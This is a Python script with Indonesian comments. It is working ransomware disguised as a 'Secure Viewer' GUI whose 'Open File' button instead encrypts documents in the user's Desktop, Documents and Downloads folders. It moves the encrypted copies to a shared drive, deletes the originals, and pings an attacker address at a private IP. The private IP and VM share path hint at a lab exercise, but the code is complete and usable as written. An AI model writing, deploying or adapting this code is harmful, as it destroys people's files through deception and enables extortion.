import os
import shutil
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
import requests

# Lokasi aman untuk simpan kunci dan log
USER_FOLDER = os.path.join(os.environ['USERPROFILE'], 'Documents')
KEY_PATH = os.path.join(USER_FOLDER, "ransom_key.key")
LOG_PATH = os.path.join(USER_FOLDER, "ransom_log.txt")

# Target sumber enkripsi
TARGET_DIRS = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Downloads")
]

# Folder shared tujuan
SHARED_DEST = "Z:\\vmshare"

# Ekstensi file target
EXTENSIONS = ['.pdf', '.docx', '.xlsx', '.txt', '.pptx']

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_PATH, "wb") as f:
        f.write(key)
    return key

def encrypt_file(file_path, fernet, log_file):
    try:
        with open(file_path, "rb") as file:
            original = file.read()
        encrypted = fernet.encrypt(original)

        encrypted_filename = os.path.basename(file_path) + ".enc"
        dest_path = os.path.join(SHARED_DEST, encrypted_filename)

        with open(dest_path, "wb") as file:
            file.write(encrypted)

        os.remove(file_path)
        log_file.write(f"Terenkripsi & Dipindah: {file_path} -> {dest_path}\n")
    except Exception as e:
        log_file.write(f"❌ Gagal: {file_path} | {e}\n")

def notify_attacker():
    try:
        requests.get("http://192.168.100.11:8080/attack", timeout=1)
    except:
        pass

def encrypt_all():
    key = generate_key()
    fernet = Fernet(key)

    if not os.path.exists(SHARED_DEST):
        os.makedirs(SHARED_DEST)

    with open(LOG_PATH, "w", encoding="utf-8") as log_file:
        log_file.write("Log Enkripsi - Ransomware GUI\n")
        log_file.write("="*40 + "\n")

        for target_dir in TARGET_DIRS:
            if not os.path.exists(target_dir):
                log_file.write(f"[❌] Folder tidak ditemukan: {target_dir}\n")
                continue

            for root, _, files in os.walk(target_dir):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in EXTENSIONS):
                        full_path = os.path.join(root, file)
                        encrypt_file(full_path, fernet, log_file)

    notify_attacker()
    messagebox.showinfo("Selesai", f"File berhasil dienkripsi & dipindah ke {SHARED_DEST}")

def launch_gui():
    root = tk.Tk()
    root.title("Secure Viewer")
    root.geometry("300x200")

    label = tk.Label(root, text="Klik tombol untuk membuka file viewer.", font=("Arial", 11))
    label.pack(pady=30)

    encrypt_btn = tk.Button(root, text="Buka File", command=encrypt_all)
    encrypt_btn.pack(pady=5)

    root.mainloop()

if __name__ == "__main__":
    launch_gui()
